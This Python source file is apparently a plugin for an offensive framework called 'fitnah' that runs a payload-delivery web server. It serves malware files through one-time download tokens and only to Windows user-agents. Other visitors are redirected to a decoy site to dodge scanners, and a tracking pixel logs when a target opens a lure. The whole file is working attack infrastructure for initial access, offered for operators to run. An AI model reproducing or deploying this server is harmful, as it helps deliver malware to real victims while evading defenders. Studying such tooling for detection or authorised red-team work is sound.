"""initial_access/delivery_server — Payload hosting HTTP server with tracking and UA filtering.

MITRE T1583.001 (Acquire Infrastructure) / T1608.001 (Upload Malware)

Offline plugin: runs entirely on the operator workstation; no live session needed.
Start with:  use delivery_server  →  run (starts background listener)
Stop with:   run action=stop
"""
import base64
import hashlib
import http.server
import ipaddress
import json
import logging
import os
import re
import socketserver
import threading
import time
import uuid
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs

from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema

log = logging.getLogger(__name__)

# ── Module-level server state (survives multiple `run` calls) ─────────────────
_server_thread: Optional[threading.Thread] = None
_httpd:         Optional[socketserver.TCPServer] = None
_access_log:    list = []                          # [{ts, ip, ua, path, token, hit}]
_tokens:        Dict[str, dict] = {}               # token → {path, one_time, used, label}
_server_lock    = threading.Lock()


# ── Request handler ───────────────────────────────────────────────────────────
class _DeliveryHandler(http.server.BaseHTTPRequestHandler):
    # Injected by DeliveryServer.run() before thread start
    config: dict = {}

    def log_message(self, fmt, *args):
        pass  # suppress default stderr logging

    def do_GET(self):
        self._handle()

    def do_HEAD(self):
        self._handle(head_only=True)

    def _handle(self, head_only: bool = False):
        parsed    = urlparse(self.path)
        path      = parsed.path
        client_ip = self.client_address[0]
        ua        = self.headers.get("User-Agent", "")
        ts        = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

        # ── Tracking pixel ────────────────────────────────────────────────────
        m = re.match(r"^/t/([0-9a-f]{32})$", path)
        if m:
            token = m.group(1)
            entry = {"ts": ts, "ip": client_ip, "ua": ua, "path": path,
                     "token": token, "event": "open"}
            with _server_lock:
                _access_log.append(entry)
            log.info(f"[delivery] OPEN  {client_ip}  ua={ua[:60]}  token={token}")
            # Return 1x1 transparent GIF
            gif = base64.b64decode(
                "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAEALAAAAAABAAEAAAICTAEAOw==")
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Content-Length", str(len(gif)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            if not head_only:
                self.wfile.write(gif)
            return

        # ── Token-based payload delivery ──────────────────────────────────────
        m = re.match(r"^/d/([0-9a-f]{32})$", path)
        if m:
            token = m.group(1)
            with _server_lock:
                tok = _tokens.get(token)
                if not tok:
                    self._send_decoy(head_only)
                    return
                if tok.get("one_time") and tok.get("used"):
                    log.info(f"[delivery] REUSE {client_ip}  token={token} (already served)")
                    self._send_decoy(head_only)
                    return
                # UA filter: only serve to Windows (skip if filter disabled)
                ua_filter = self.config.get("ua_filter", True)
                if ua_filter and not _is_windows_ua(ua):
                    log.info(f"[delivery] BLOCK {client_ip}  ua={ua[:60]}  (non-Windows UA)")
                    self._send_decoy(head_only)
                    return
                file_path = tok["path"]
                if not os.path.isfile(file_path):
                    self.send_error(404)
                    return
                if tok.get("one_time"):
                    tok["used"] = True
                entry = {"ts": ts, "ip": client_ip, "ua": ua, "path": path,
                         "token": token, "event": "download", "file": file_path}
                _access_log.append(entry)
            log.info(f"[delivery] SERVE {client_ip}  file={os.path.basename(file_path)}  token={token}")
            self._serve_file(file_path, head_only)
            return

        # ── Static payload directory (optional) ───────────────────────────────
        static_dir = self.config.get("static_dir", "")
        if static_dir and path.startswith("/static/"):
            rel = path[len("/static/"):]
            # Block path traversal
            full = os.path.normpath(os.path.join(static_dir, rel))
            if not full.startswith(os.path.normpath(static_dir)):
                self.send_error(403)
                return
            if os.path.isfile(full):
                entry = {"ts": ts, "ip": client_ip, "ua": ua, "path": path,
                         "token": "", "event": "static"}
                with _server_lock:
                    _access_log.append(entry)
                self._serve_file(full, head_only)
                return

        # ── Anything else → decoy redirect ────────────────────────────────────
        self._send_decoy(head_only)

    def _serve_file(self, file_path: str, head_only: bool):
        ext  = os.path.splitext(file_path)[1].lower()
        ctype = {
            ".ps1": "text/plain",
            ".hta": "text/html",
            ".doc": "application/msword",
            ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ".xls": "application/vnd.ms-excel",
            ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            ".exe": "application/octet-stream",
            ".dll": "application/octet-stream",
            ".vbs": "text/vbs",
            ".js":  "text/javascript",
            ".zip": "application/zip",
        }.get(ext, "application/octet-stream")
        size = os.path.getsize(file_path)
        fname = os.path.basename(file_path)
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(size))
        self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if not head_only:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    self.wfile.write(chunk)

    def _send_decoy(self, head_only: bool):
        decoy = self.config.get("decoy_url", "https://microsoft.com")
        body  = f'<html><head><meta http-equiv="refresh" content="0;url={decoy}"></head></html>'
        b     = body.encode()
        self.send_response(302)
        self.send_header("Location", decoy)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        if not head_only:
            self.wfile.write(b)


def _is_windows_ua(ua: str) -> bool:
    ua_lower = ua.lower()
    return ("windows" in ua_lower or "win64" in ua_lower or "win32" in ua_lower
            or "msie" in ua_lower or "trident" in ua_lower)


# ── Plugin ────────────────────────────────────────────────────────────────────
class DeliveryServer(BasePlugin):
    NAME        = "delivery_server"
    DESCRIPTION = "Payload hosting HTTP server: one-time tokens, UA filtering, tracking, decoy redirect."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1608.001"
    CATEGORY    = "initial_access"

    schema = ParamSchema().add(
        Param("action",    str, required=False, default="start",
              help="start | stop | status | add_payload | log"),
        Param("host",      str, required=False, default="0.0.0.0",
              help="Bind address"),
        Param("port",      int, required=False, default=8080,
              help="Listen port"),
        Param("payload",   str, required=False, default="",
              help="[add_payload] Path to file to serve"),
        Param("label",     str, required=False, default="",
              help="[add_payload] Human-readable label for this payload"),
        Param("one_time",  bool, required=False, default=True,
              help="[add_payload] Burn token after first download"),
        Param("decoy_url", str, required=False, default="https://microsoft.com",
              help="URL to redirect non-matching requests to"),
        Param("ua_filter", bool, required=False, default=True,
              help="Only serve to Windows user-agents"),
        Param("static_dir", str, required=False, default="",
              help="Optional directory served at /static/ (no token required)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        action = params.get("action", "start").lower()

        if action == "start":
            return self._start(params)
        elif action == "stop":
            return self._stop()
        elif action == "status":
            return self._status()
        elif action == "add_payload":
            return self._add_payload(params)
        elif action == "log":
            return self._show_log()
        return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _start(params: dict) -> ModuleResult:
        global _httpd, _server_thread

        with _server_lock:
            if _httpd is not None:
                return ModuleResult.err("Delivery server is already running. Stop it first.")

            host = params.get("host", "0.0.0.0")
            port = int(params.get("port", 8080))

            # Inject config into handler class
            _DeliveryHandler.config = {
                "decoy_url":  params.get("decoy_url", "https://microsoft.com"),
                "ua_filter":  params.get("ua_filter", True),
                "static_dir": params.get("static_dir", ""),
            }

            socketserver.TCPServer.allow_reuse_address = True
            try:
                _httpd = socketserver.TCPServer((host, port), _DeliveryHandler)
            except OSError as e:
                _httpd = None
                return ModuleResult.err(f"Failed to bind {host}:{port} — {e}")

            _server_thread = threading.Thread(target=_httpd.serve_forever, daemon=True)
            _server_thread.start()

        log.info(f"[delivery] Server started on {host}:{port}")
        return ModuleResult.ok(
            data=(f"[+] Delivery server listening on http://{host}:{port}\n"
                  f"    Decoy redirect : {_DeliveryHandler.config['decoy_url']}\n"
                  f"    UA filter      : {_DeliveryHandler.config['ua_filter']}\n"
                  f"    Use action=add_payload to register files.\n"
                  f"    Download URL   : http://<your_ip>:{port}/d/<token>\n"
                  f"    Tracking pixel : http://<your_ip>:{port}/t/<token>"),
            loot_kind="delivery_server",
        )

    @staticmethod
    def _stop() -> ModuleResult:
        global _httpd, _server_thread
        with _server_lock:
            if _httpd is None:
                return ModuleResult.err("Delivery server is not running.")
            _httpd.shutdown()
            _httpd = None
            _server_thread = None
        return ModuleResult.ok(data="[+] Delivery server stopped.", loot_kind="delivery_server")

    @staticmethod
    def _status() -> ModuleResult:
        with _server_lock:
            running = _httpd is not None
            token_count = len(_tokens)
            served = sum(1 for t in _tokens.values() if t.get("used"))
            hit_count = len(_access_log)
        lines = [
            f"Status        : {'RUNNING' if running else 'STOPPED'}",
            f"Tokens active : {token_count - served}/{token_count}",
            f"Access events : {hit_count}",
        ]
        if _tokens:
            lines.append("\nPayloads:")
            for tok, info in _tokens.items():
                used = "USED" if info.get("used") else "active"
                lines.append(f"  {tok}  [{used}]  {info.get('label') or os.path.basename(info['path'])}")
        return ModuleResult.ok(data="\n".join(lines), loot_kind="delivery_server")

    @staticmethod
    def _add_payload(params: dict) -> ModuleResult:
        payload_path = params.get("payload", "").strip()
        if not payload_path or not os.path.isfile(payload_path):
            return ModuleResult.err(f"File not found: {payload_path}")
        token    = uuid.uuid4().hex
        one_time = params.get("one_time", True)
        label    = params.get("label", "").strip() or os.path.basename(payload_path)
        with _server_lock:
            _tokens[token] = {
                "path":     payload_path,
                "one_time": one_time,
                "used":     False,
                "label":    label,
            }
        # Derive the base URL from current server config or fall back to placeholder
        port = 8080
        if _httpd:
            try:
                port = _httpd.server_address[1]
            except Exception:
                pass
        download_url = f"http://<your_ip>:{port}/d/{token}"
        return ModuleResult.ok(
            data=(f"[+] Payload registered: {label}\n"
                  f"    Token      : {token}\n"
                  f"    One-time   : {one_time}\n"
                  f"    Download   : {download_url}\n"
                  f"    Tracking   : http://<your_ip>:{port}/t/{token}"),
            loot_kind="delivery_server",
        )

    @staticmethod
    def _show_log() -> ModuleResult:
        with _server_lock:
            entries = list(_access_log)
        if not entries:
            return ModuleResult.ok(data="No access events yet.", loot_kind="delivery_server")
        lines = ["ts                    event     ip               token                            ua"]
        lines.append("-" * 110)
        for e in entries[-50:]:  # last 50
            lines.append(
                f"{e['ts']}  {e['event']:<9} {e['ip']:<16}  "
                f"{e.get('token',''):<32}  {e.get('ua','')[:50]}"
            )
        return ModuleResult.ok(data="\n".join(lines), loot_kind="delivery_server")
